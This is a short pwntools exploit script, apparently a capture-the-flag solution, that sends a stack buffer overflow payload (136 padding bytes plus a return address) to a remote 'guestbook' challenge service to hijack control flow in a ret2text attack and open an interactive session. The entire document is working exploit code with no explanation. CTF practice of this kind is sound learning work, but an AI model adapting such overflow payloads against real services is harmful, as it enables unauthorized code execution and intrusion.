#Made by fly_autumn
#x64 ret2text
from pwn import *
#p = process("./guestbook")
p = remote("node5.buuoj.cn",28754)
elf = ELF("./guestbook")
context(os="linux",arch="amd64")

p.recvuntil(b"message:\n")
offset = 136
func_plt = 0x400620
payload = b"\x00" * offset + p64(func_plt)
p.sendline(payload)

p.interactive()
